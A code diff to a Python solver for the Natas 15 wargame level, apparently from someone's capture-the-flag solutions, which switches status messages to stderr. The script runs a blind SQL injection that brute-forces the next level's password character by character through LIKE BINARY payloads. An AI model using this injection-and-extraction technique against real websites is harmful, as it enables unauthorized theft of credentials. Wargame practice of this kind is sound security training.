@@ -9,7 +9,7 @@ import sys
 try:
     natas15pass = os.environ['natas15pass']
 except:
-    print('run source hackall.sh')
+    printerr('run source hackall.sh')
     exit(1)
 
 dict = '0123456789aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ '
@@ -17,6 +17,9 @@ plTemplate = 'natas16" AND password LIKE BINARY "'
 
 passwd = ''
 bkp_path = 'natas16/.password'
+
+def printerr(*args, **kwargs):
+    print(*args, file = sys.stderr, **kwargs)
 
 def mkReqWithPayload(pl):
     return rq.post(
@@ -36,14 +39,14 @@ def reset():
     f = open(bkp_path, 'wb')
     f.write(passwd.encode('ascii'))
     f.close()
-    print('\rnatas16 pass reset')
+    printerr('\rnatas16 pass reset')
 
 def exit_gracefully():
-    print('\033[?25h', end = '')
+    printerr('\033[?25h', end = '')
     sys.exit(0)
 
 def sigint_handler(sig, frame):
-    print('\nSIGINT recieved')
+    printerr('\nSIGINT recieved')
     exit_gracefully()
 
 def verify():
@@ -67,10 +70,10 @@ def bruteForce():
             pl = plTemplate + passwd + i + '%'
             r = mkReqWithPayload(pl)
             if r.ok: 
-                print('\rtried:', passwd + i, end = '')
+                printerr('\rtried:', passwd + i, end = '')
                 if r.text.find('This user exists.') > -1:
                     passwd += i
-                    print('\rhit:  ', passwd)
+                    printerr('\rhit:  ', passwd)
                     bkp = open(bkp_path, 'wb')
                     bkp.write(passwd.encode('ascii'))
                     bkp.close()
@@ -95,6 +98,6 @@ if verify():
 elif len(passwd) == 32:
     reset()
 
-print('\033[?25l', end = '')
+printerr('\033[?25l', end = '')
 
 bruteForce()
